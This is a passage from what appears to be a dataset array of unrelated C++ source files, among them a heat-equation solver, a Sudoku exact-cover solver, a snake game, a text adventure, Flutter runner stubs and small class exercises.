\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0440\u0435\u043c\u044f \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u044f \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b: \";\n    //cin >> Tn;\n    cin >> t_end;\n\n    std::vector<double> T(n);\n    //double *T = new double[n];\n    std::vector<double> TT(n);\n    //double *TT = new double[n];\n\n    //\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b \u043d\u0430 \u043a\u0430\u0436\u0434\u043e\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u043c \u0441\u043b\u043e\u0435\n    T[0] = T0;\n    T[n-1] = Tc;\n    //\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u043e\u043b\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b \u0432 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0432\u0440\u0435\u043c\u0435\u043d\u0438\n    for(int i = 1; i < n-1; i++)\n    {\n        T[i] = T0;\n    }\n\n    std::vector<double> x(n);\n    //double *x = new double[n];\n    std::vector<double> y(n);\n    //double *y = new double[n];\n    for(int i = 0; i < n; i++)\n    {\n        x[i] = xbeg + i * h;\n        y[i] = xbeg + i * h;\n    }\n\n    double time = 0;\n\n    double tau = (h * h) / (4 * k);\n\n    if( tau < (h * h) / (2 * k))\n        cout << \"\u0423\u0441\u043b\u043e\u0432\u0438\u0435 \u0443\u0441\u0442\u043e\u0439\u0447\u0438\u0432\u043e\u0441\u0442\u0438 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f\" << endl;\n    else \n        cout << \"\u0423\u0441\u043b\u043e\u0432\u0438\u0435 \u0443\u0441\u0442\u043e\u0439\u0447\u0438\u0432\u043e\u0441\u0442\u0438 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f\" << endl;\n\n    cout << tau << endl;\n\n    do\n    {\n        time += tau;\n\n        //\u0417\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u0435\u043c \u043f\u043e\u043b\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b \u043d\u0430 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u043c \u0441\u043b\u043e\u0435 \u043f\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438\n        for(int i = 0; i < n; i++)\n        {\n            TT[i] = T[i]; \n            \n        }\n        //\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e\u0435 \u043f\u043e\u043b\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b \u043f\u043e \u0441\u043e\u043e\u0442\u043d\u043e\u0448\u0435\u043d\u0438\u044f\u043c\n        for(int i = 1; i < n-1; i++)\n        {\n            T[i] = TT[i] + k*tau/(h*h)*(TT[i+1]-2*TT[i]+TT[i-1]);\n        }\n    }\n    while(time <= t_end);\n\n    std::ofstream graphic(\"Data_1.txt\");\n\n    for (int i = 0; i < n; i++)\n    {\n        cout << \"x(\" << i << \")= \" << x[i] << \"  \" << \"y(\" << i << \")=\" << y[i] << \" \"<< \"T[\" << i << \"]= \" << T[i] << endl;\n        graphic << x[i] << \" \" << y[i] << \" \" << T[i] << endl;\n    }\n    \n    //using namespace matplot;\n\n    //surf(x, y, T);\n\n    //plot(x,y,\"-o\");\n    //show();\n    \n    //delete[] x;\n    //delete[] y;\n    //delete[] T;\n    //delete[] TT;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include \"my_time_lib.h\"\n\nusing namespace std;\nusing namespace my_time_lib;\n\ns_date\tft_add_days_to_a_date(int nbr_of_adding_days, s_date prev_date_s)\n{\n\tshort\tremaining_days;\n\tshort\tmonth_days;\n\n\tremaining_days = (ft_nbr_of_days_from_the_beginning_of_the_year(prev_date_s) + nbr_of_adding_days);\n\tprev_date_s.month = 1;\n\twhile (1)\n\t{\n\t\tmonth_days = ft_nbr_of_days_in_a_month(prev_date_s);\n\t\tif (remaining_days > month_days)\n\t\t{\n\t\t\tremaining_days -= month_days;\n\t\t\t(prev_date_s.month)++;\n\t\t\tif((prev_date_s.month) > 12)\n\t\t\t{\n\t\t\t\t(prev_date_s.month) = 1;\n\t\t\t\t(prev_date_s.year)++;\n\t\t\t}\n\t\t}\n\t\telse \n\t\t{\n\t\t\tprev_date_s.day = remaining_days;\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn (prev_date_s);\n}\n\ns_date\tft_read_date_s()\n{\n\ts_date  date_s;\n\n\tdate_s.day = ft_read_day();\n\tdate_s.month = ft_read_month();\n\tdate_s.year = ft_read_year();\n\treturn (date_s);\n}\n\nint\tft_set_nbr_of_adding_days()\n{\n\tint\tnbr_of_adding_days;\n\n\tprintf(\"\\n\\nPlease enter how many days you want to add:  \");\n\tcin >> nbr_of_adding_days;\n\treturn (nbr_of_adding_days);\n}\n\nint\tmain (void)\n{\n\ts_date\tdate_s;\n\n\tdate_s = ft_read_date_s();\n\tdate_s = ft_add_days_to_a_date(ft_set_nbr_of_adding_days(), date_s);\n\tprintf(\"\\n\\nThe date after adding the days is:   %hd/%hd/%hd\\n\\n\", date_s.day, date_s.month, date_s.year);\n\n\n\n\treturn (0);\n}\n",
    "\n#include \"ExactCover.h\"\n\n#include <iostream>\n#include <format>\n\n#include <chrono>\n\nvoid TestSudoku(ExactCover cov, const char** board, ExactCover::id_t moves[9][9][9])\n{\n\t// Create additional constraints for the given values\n\n\tfor (int i = 0; i < 9; ++i) {\n\t\tfor (int j = 0; j < 9; ++j) {\n\t\t\tint k = board[i][j] - '0';\n\t\t\tif (!k) continue;\n\t\t\tcov.ConstrainMove(moves[i][j][k - 1], cov.AddConstraint(std::format(\"given_{}_{}_{}\", i + 1, j + 1, k)));\n\t\t}\n\t}\n\n\tstd::deque<ExactCover::solution_t> spud;\n\n\t{\n\t\tusing namespace std::chrono;\n\n\t\tauto startTime = system_clock::now();\n\t\tcov.Solve(spud);\n\t\tauto endTime = system_clock::now();\n\t\tstd::cout << \"Solve time: \" << duration_cast<microseconds>(endTime - startTime).count() / 1000.0 << \"ms\\n\";\n\t}\n\n\tstd::cout << \"Number of solutions: \" << spud.size() << '\\n';\n\n\tfor (auto& s : spud) {\n\t\tfor (int i = 0; i < 9; ++i) {\n\t\t\tfor (int j = 0; j < 9; ++j) {\n\t\t\t\tfor (int k = 0; k < 9; ++k) {\n\t\t\t\t\tif (std::find(s.begin(), s.end(), moves[i][j][k]) != s.end()) {\n\t\t\t\t\t\tstd::cout << (k + 1);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t}\n\t\t\tstd::cout << '\\n';\n\t\t}\n\t\tstd::cout << '\\n';\n\t}\n}\n\nint main()\n{\n\tExactCover cov;\n\tcov.SolutionSize(81);\n\n\t// Create the Sudoku constraints\n\n\t// rowConstraints[i][k] means that row i contains value k\n\tExactCover::id_t rowConstraints[9][9];\n\t// colConstraints[j][k] means that column j contains value k\n\tExactCover::id_t colConstraints[9][9];\n\t// boxConstraints[b][k] means that box b contains value k\n\tExactCover::id_t boxConstraints[9][9];\n\t// occConstraints[i][j] means that row i column j contains a value\n\tExactCover::id_t occConstraints[9][9];\n\n\tfor (int i = 0; i < 9; ++i) {\n\t\tfor (int j = 0; j < 9; ++j) {\n\t\t\trowConstraints[i][j] = cov.AddConstraint(std::format(\"row_{}_{}\", i + 1, j + 1));\n\t\t\tcolConstraints[i][j] = cov.AddConstraint(std::format(\"col_{}_{}\", i + 1, j + 1));\n\t\t\tboxConstraints[i][j] = cov.AddConstraint(std::format(\"box_{}_{}\", i + 1, j + 1));\n\t\t\toccConstraints[i][j] = cov.AddConstraint(std::format(\"occ_{}_{}\", i + 1, j + 1));\n\t\t}\n\t}\n\n\t// Create all possible moves\n\n\t// moves[i][j][k] means that value k was placed in row i column j\n\tExactCover::id_t moves[9][9][9];\n\tfor (int i = 0; i < 9; ++i) {\n\t\tfor (int j = 0; j < 9; ++j) {\n\t\t\tint b = (i / 3) * 3 + (j / 3);\n\t\t\tfor (int k = 0; k < 9; ++k) {\n\t\t\t\tauto move = cov.AddMove(std::format(\"{}_{}_{}\", i + 1, j + 1, k + 1));\n\t\t\t\tmoves[i][j][k] = move;\n\n\t\t\t\tcov.ConstrainMove(move, rowConstraints[i][k]);\n\t\t\t\tcov.ConstrainMove(move, colConstraints[j][k]);\n\t\t\t\tcov.ConstrainMove(move, boxConstraints[b][k]);\n\t\t\t\tcov.ConstrainMove(move, occConstraints[i][j]);\n\t\t\t}\n\t\t}\n\t}\n\n\t// Test sudoku puzzles\n\n\t// Platinum Blonde\n\tstatic const char* platinumBlonde[9] = {\n\t\t\"000000012\",\n\t\t\"000000003\",\n\t\t\"002300400\",\n\t\t\"001800005\",\n\t\t\"060070800\",\n\t\t\"000009000\",\n\t\t\"008500000\",\n\t\t\"900040500\",\n\t\t\"470006000\"\n\t};\n\tTestSudoku(cov, platinumBlonde, moves);\n\n\t// AI Escargot by Arto Inkala\n\tstatic const char* aiEscargot[9] = {\n\t\t\"800000000\",\n\t\t\"003600000\",\n\t\t\"070090200\",\n\t\t\"050007000\",\n\t\t\"000045700\",\n\t\t\"000100030\",\n\t\t\"001000068\",\n\t\t\"008500010\",\n\t\t\"090000400\"\n\t};\n\tTestSudoku(cov, aiEscargot, moves);\n\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"provider_plugin\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include \"include/utils.hpp\"\n#include \"include/engine.hpp\"\n#include \"include/combats.hpp\"\n#include \"include/cutscenes.hpp\"\n\nchar first_character_matrix[HEIGHT_SCREEN][WIDTH_SCREEN];\nchar second_character_matrix[HEIGHT_SCREEN][WIDTH_SCREEN];\nchar dialog_matrix[HEIGHT_SCREEN][WIDTH_SCREEN];\n\nint main() {\n\tinitialize_matrix(first_character_matrix);\n\tinitialize_matrix(second_character_matrix);\n\tinitialize_matrix(dialog_matrix);\n\n\tclear();\n\tprocess_title(\"assets/configuration-screen_1\");\n\trefresh(2000);\n\tprocess_title(\"assets/configuration-screen_2\");\n\tenter\n\n\tclear();\n\tprocess_title(\"assets/title_screen_1.txt\");\n\trefresh(2000);\n\tprocess_title(\"assets/title_screen_2.txt\");\n\tenter\n\n\tclear();\n\tprocess_prologue(dialog_matrix, 2);\n\n\tclear();\n\trefresh(1000);\n\n\tfor (int i = 3; i <= 19; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\tclear();\n\tprocess_dialog_scene(\"assets/daniel/daniel_r\", 20, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary_l\", 21, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/daniel/daniel_r\", 22, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/daniel/daniel_o_r\", 23, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary_o_l\", 24, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/daniel/daniel_o\", 25, 'd', second_character_matrix, dialog_matrix);\n\n\tif (tutorial()) {\n\t\tprocess_dialog_scene(\"assets/daniel/daniel_r\", 26, 'd', second_character_matrix, dialog_matrix);\n\t}\n\telse {\n\t\tprocess_dialog_scene(\"assets/daniel/daniel_r\", 27, 'd', second_character_matrix, dialog_matrix);\n\t}\n\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/daniel/daniel_o_r\", 28, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\tfor (int i = 29; i <= 33; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/el-general/el-general\", 34, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary_o\", 35, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/el-general/el-general\", 36, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary\", 37, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/el-general/el-general\", 38, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/el-general/el-general_o\", 39, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary_o\", 40, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/el-general/el-general\", 41, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\t// HERE STARTS THE FIRST FIGHT\n\tscombat(false, \"EL GENERAL: Sabes, no llegue hasta aqui perdiendo partidas.\", \"EL GENERAL: Veamos que tienes...\", \"el General\");\n\tprocess_dialog_scene(\"assets/el-general/el-general\", 42, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\tfor (int i = 43; i <= 58; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto\", 59, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto_o\", 60, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto\", 61, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\tfor (int i = 62; i <= 63; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto\", 64, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto_o\", 65, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/roberto/roberto\", 66, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\n\tfor (int i = 67; i <= 70; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/prisioners/prisioner-1\", 71, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/prisioners/prisioner-1\", 72, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/mary/mary_o\", 73, 'd', first_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/prisioners/prisioner-1\", 74, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\tprocess_dialog_scene(\"assets/prisioners/prisioner-1\", 75, 'd', second_character_matrix, dialog_matrix);\n\trefresh(3600);\n\n\tfor (int i = 76; i <= 78; i++) {\n\t\tprocess_prologue(dialog_matrix, i);\n\t}\n\n\tif (combat(\"MARCELO: Vas a caer, mierda.\", \"MARCELO: Veamos que sacaste...\", \"Marcelo\"))\n\t\tprocess_dialog_scene(\"assets/prisioners/prisioner-1\", 79, 'd', second_chara",
    "#include <ncurses.h>\n#include <unistd.h>\n#include <random>\n\nconst int WIDTH = 30;\nconst int HEIGHT = 13;\nconst int MAX_LEN_SNAKE = (WIDTH - 2) * (HEIGHT - 2);\n\nbool gameRunning = true;\n\nchar map[HEIGHT][WIDTH + 1] = {\n    \"##############################\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"#                            #\",\n    \"##############################\"\n};\n\nclass Snake\n{\npublic:\n    int snake_x[MAX_LEN_SNAKE] = {0};\n    int snake_y[MAX_LEN_SNAKE] = {0};\n    int snake_len = 1;\n    int snakeDir = 0; // 0 - UP, 1 - DOWN, 2 - RIGHT, 3 - LEFT\n    int prevDir = 0;  // Track the previous direction to prevent reversing\n    char snake = 'O';\n\n    void placeSnake()\n    {\n        for (int i = 0; i < snake_len; ++i)\n        {\n            map[snake_y[i]][snake_x[i]] = snake;\n        }\n    }\n\n    void updateSnake()\n    {\n        for (int i = 1; i < snake_len; ++i)\n        {\n            if (snake_len > 1 && (snake_x[0] == snake_x[i] && snake_y[0] == snake_y[i]))\n            {\n                gameRunning = false;\n            }\n        }\n\n        for (int i = snake_len - 1; i > 0; --i)\n        {\n            snake_x[i] = snake_x[i - 1];\n            snake_y[i] = snake_y[i - 1];\n        }\n    }\n\n    void clearSnake()\n    {\n        for (int i = 0; i < snake_len; ++i)\n        {\n            map[snake_y[i]][snake_x[i]] = ' ';\n        }\n    }\n\n    void snakeMovement()\n    {\n        switch (snakeDir)\n        {\n            case 0: // UP\n                --snake_y[0];\n                break;\n            case 1: // DOWN\n                ++snake_y[0];\n                break;\n            case 2: // RIGHT\n                ++snake_x[0];\n                break;\n            case 3: // LEFT\n                --snake_x[0];\n                break;\n        }\n\n        prevDir = snakeDir;\n    }\n\n    void setDirection(int newDir)\n    {\n        // prevent reversing\n        if ((snakeDir == 0 && newDir != 1) ||\n            (snakeDir == 1 && newDir != 0) ||\n            (snakeDir == 2 && newDir != 3) ||\n            (snakeDir == 3 && newDir != 2))\n        {\n            snakeDir = newDir;\n        }\n    }\n\n    void grow()\n    {\n        if (snake_len < MAX_LEN_SNAKE)\n        {\n            snake_len++;\n        }\n    }\n};\n\nclass Apple\n{\nprivate:\n    int getRandomNum(int min, int max)\n    {\n        std::random_device rd;\n        std::mt19937 gen(rd());\n        std::uniform_int_distribution<> dist(min, max);\n        return dist(gen);\n    }\n\npublic:\n    int x = 0, y = 0;\n\n    void spawnApple()\n    {\n        x = getRandomNum(1, WIDTH - 3);\n        y = getRandomNum(1, HEIGHT - 3);\n        map[y][x] = '@';\n    }\n};\n\nvoid drawMap()\n{\n    clear();\n\n    for (int y = 0; y < HEIGHT; ++y)\n    {\n        for (int x = 0; x < WIDTH; ++x)\n        {\n            mvaddch(y, x, map[y][x]);\n        }\n    }\n    refresh();\n}\n\nint main() {\n    initscr();\n    cbreak();\n    keypad(stdscr, TRUE);\n    noecho();\n    timeout(250);\n\n    Snake snake;\n    Apple apple;\n\n    snake.snake_x[0] = WIDTH / 2;\n    snake.snake_y[0] = HEIGHT / 2;\n\n    apple.spawnApple();\n\n    while (gameRunning)\n    {\n        int ch = getch();\n\n        switch (ch)\n        {\n            case KEY_UP:\n                snake.setDirection(0);\n                break;\n            case KEY_DOWN:\n                snake.setDirection(1);\n                break;\n            case KEY_RIGHT:\n                snake.setDirection(2);\n                break;\n            case KEY_LEFT:\n                snake.setDirection(3);\n                break;\n            case 'q':\n                gameRunning = false;\n                break;\n        }\n\n        snake.clearSnake();\n        snake.updateSnake();\n        snake.snakeMovement();\n\n        // going beyond the boundaries\n        if (snake.snake_x[0] < 1 || snake.snake_x[0] >= WIDTH - 1 || snake.snake_y[0] < 1 || snake.snake_y[0] >= HEIGHT - 2)\n        {\n            gameRunning = false;\n        }\n\n        // eat apple\n        if (snake.snake_x[0] == apple.x && snake.snake_y[0] == apple.y)\n        {\n            snake.grow();\n            apple.spawnApple();\n        }\n\n        snake.placeSnake();\n\n        drawMap();\n\n        usleep(5000);\n    }\n\n    endwin();\n    return 0;\n}\n",
    "#include <SDL2/SDL.h>\n#include <stdexcept>\n#include \"reg.hpp\"\n\n\nclass Registers {\n    private:\n        Uint8 registers[8]; \n    public:\n        Uint16 getReg(uint reg){\n            if(reg > HL) throw std::invalid_argument(\"not a register\");\n            if(reg >= AF) {\n                switch(reg) {\n                    case AF: \n                        return (registers[A] << 8) | registers[F];\n                    break;\n                    case BC: \n                        return (registers[B] << 8) | registers[C];\n                    break;\n                    case DE: \n                        return (registers[D] << 8) | registers[E];\n                    break;\n                    case HL: \n                        return (registers[H] << 8) | registers[L];\n                    break;\n                }\n            } else {\n                return registers[reg];\n            }\n        }\n\n        void setReg(int reg, Uint16 value) {\n            if(reg > HL) throw std::invalid_argument(\"not a register\");\n            if(reg >= AF) {\n                switch(reg) {\n                    case AF: \n                        registers[A] = value >> 8;\n                        registers[F] = value; \n                    break;\n                    case BC: \n                        registers[B] = value >> 8;\n                        registers[C] = value; \n                    break;\n                    case DE: \n                        registers[D] = value >> 8;\n                        registers[E] = value; \n                    break;\n                    case HL: \n                        registers[H] = value >> 8;\n                        registers[L] = value; \n                    break;\n                }\n            } else {\n                if(value > 255) throw std::invalid_argument(\"value too big\");\n                registers[reg] = value;\n            }\n        }\n};\n",
    "#include <iostream>\r\n#include <string>\r\n#include <conio.h>\r\n#include <windows.h>\r\nchar bufRus[256];\r\nchar* Rus(const char* text) {\r\n\tCharToOemA(text, bufRus);\r\n\treturn bufRus;\r\n}\r\n\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\nclass Operator\r\n{\r\npublic:\r\n\r\n\tOperator() : name(\"Noname\"), abonentsCount(0), price(0) {};\r\n\tOperator(string n, int c, double p) {\r\n\t\tname = n;\r\n\t\tif (c < 0) {\r\n\t\t\tabonentsCount = 0;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tabonentsCount = c;\r\n\t\t}\r\n\t\tif (p < 0) {\r\n\t\t\tprice = 0;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tprice = p;\r\n\t\t}\r\n\t};\r\n\tdouble getRevenue() {\r\n\t\treturn price * abonentsCount;\r\n\t}\r\n\t\r\n\tstring getName() {\r\n\t\treturn name;\r\n\t}\r\n\r\n\tvoid setAbonentsCount(int count) {\r\n\t\tif (count < 0) {\r\n\t\t\tabonentsCount = 0;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tabonentsCount = count;\r\n\t\t}\r\n\t}\r\n\r\n\tvoid setPrice(double p) {\r\n\t\tif (p < 0) {\r\n\t\t\tprice = 0;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tprice = p;\r\n\t\t}\r\n\t}\r\n\r\n\tvoid setName(string n) {\r\n\t\tname = n;\r\n\t}\r\n\r\nprivate:\r\n\tstring name;\r\n\tdouble price;\r\n\tint abonentsCount;\r\n\r\n};\r\n\r\n\r\n\r\n\r\nint main(){\r\n\tOperator MTS(\"MTS\", 10, 15);\r\n\tprintf(Rus(\"\u00c2\u00fb\u00f0\u00f3\u00f7\u00ea\u00e0 \u00ea\u00ee\u00ec\u00ef\u00e0\u00ed\u00e8\u00e8 %s: %f\"),MTS.getName().c_str(), MTS.getRevenue());\r\n\treturn 0;\r\n}",
    "#include \"Balances.h\"\n\n\nvoid Balances::notifyObservers() {\n    for (IObserver* obs : observers) {\n        obs->update();\n    }\n}\n\nbool Balances::canWithdraw(Currency currency, double amount)\n{\n    return balance[currency] - amount > 0;\n}\n\nvoid Balances::addAmount(Currency currency, double amount)\n{\n    balance[currency] += amount;\n}\n\nvoid Balances::withdrawAmount(Currency currency, double amount)\n{\n    if (canWithdraw(currency, amount))\n    {\n        balance[currency] -= amount;\n    }\n}\nvoid Balances::displayBalances() {\n    std::cout << std::fixed << std::setprecision(2);\n    std::cout << owner << \":\\n\";\n    std::cout << \"RUB: \" << balance[Currency::RUB] << \"\\n\";\n    std::cout << \"USD: \" << balance[Currency::USD] << \"\\n\";\n    std::cout << \"EUR: \" << balance[Currency::EUR] << \"\\n\";\n    std::cout << \"USDT: \" << balance[Currency::USDT] << \"\\n\";\n    std::cout << \"BTC: \" << balance[Currency::BTC] << \"\\n\";\n}\n\nvoid Balances::addObserver(IObserver* obs) {\n    observers.push_back(obs);\n}\n\nvoid Balances::removeObserver(IObserver* obs) {\n    observers.erase(remove(observers.begin(), observers.end(), obs), observers.end());\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_tests_ci\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"lyrictextedit.h\"\n#include<QDebug>\n\n\nvoid LyricTextEdit::highlightLine(int lineNumber)\n{\n\n    QTextBlock block1 = this->document()->findBlockByNumber(this->currentLine);\n\n    if (block1.isValid())\n    {\n        // \u521b\u5efa\u4e00\u4e2a\u5149\u6807\u5e76\u5b9a\u4f4d\u5230\u8be5\u884c\n        QTextCursor cursor(block1);\n\n        // \u9009\u4e2d\u6574\u884c\n        cursor.select(QTextCursor::LineUnderCursor);\n\n        resetLineFormat(cursor);\n    }\n\n    // \u83b7\u53d6\u6307\u5b9a\u884c\u7684 QTextBlock\n    QTextBlock block = this->document()->findBlockByNumber(lineNumber);\n\n    if (block.isValid())\n    {\n        // \u521b\u5efa\u4e00\u4e2a\u5149\u6807\u5e76\u5b9a\u4f4d\u5230\u8be5\u884c\n        QTextCursor cursor(block);\n\n        // \u9009\u4e2d\u6574\u884c\n        cursor.select(QTextCursor::LineUnderCursor);\n\n        //qDebug()<<cursor.selectedText();\n\n        highlightLineFormat(cursor);\n    }\n\n\n}\n\nvoid LyricTextEdit::resetLineFormat(QTextCursor &cursor)\n{\n    cursor.select(QTextCursor::LineUnderCursor);\n    QTextCharFormat format;\n    format.setFontWeight(QFont::Normal);\n    format.setFontPointSize(16);  // \u6062\u590d\u9ed8\u8ba4\u5b57\u53f7\n    cursor.mergeCharFormat(format);\n}\n\n// \u8bbe\u7f6e\u9ad8\u4eae\u884c\u7684\u683c\u5f0f\nvoid LyricTextEdit::highlightLineFormat(QTextCursor &cursor)\n{\n    cursor.select(QTextCursor::LineUnderCursor);\n    QTextCharFormat format;\n    format.setFontWeight(QFont::Bold);\n    format.setFontPointSize(20);  // \u8bbe\u7f6e\u9ad8\u4eae\u5b57\u53f7\n    cursor.mergeCharFormat(format);\n}\n\nvoid LyricTextEdit::updateScrollBar()\n{\n    // \u83b7\u53d6\u6587\u6863\u7684\u603b\u9ad8\u5ea6\n    int documentHeight = this->document()->size().height();\n\n    // \u83b7\u53d6\u89c6\u53e3\u7684\u9ad8\u5ea6\n    int viewportHeight = this->viewport()->height();\n\n    // \u8bbe\u7f6e\u6eda\u52a8\u6761\u7684\u8303\u56f4\n    QScrollBar *scrollBar = this->verticalScrollBar();\n    scrollBar->setRange(0, documentHeight - viewportHeight);\n\n    // \u5982\u679c\u6587\u6863\u7684\u9ad8\u5ea6\u5c0f\u4e8e\u89c6\u53e3\u7684\u9ad8\u5ea6\uff0c\u786e\u4fdd\u6eda\u52a8\u6761\u503c\u4e3a0\n    if (documentHeight <= viewportHeight)\n    {\n        scrollBar->setValue(0);\n    }\n}\nvoid LyricTextEdit::disableScrollBar()\n{\n    QScrollBar *scrollBar = this->verticalScrollBar();\n    scrollBar->setEnabled(false);\n    scrollBar->setVisible(false);\n}\n\nint LyricTextEdit::getLineHeight(int fontSize)\n{\n    // 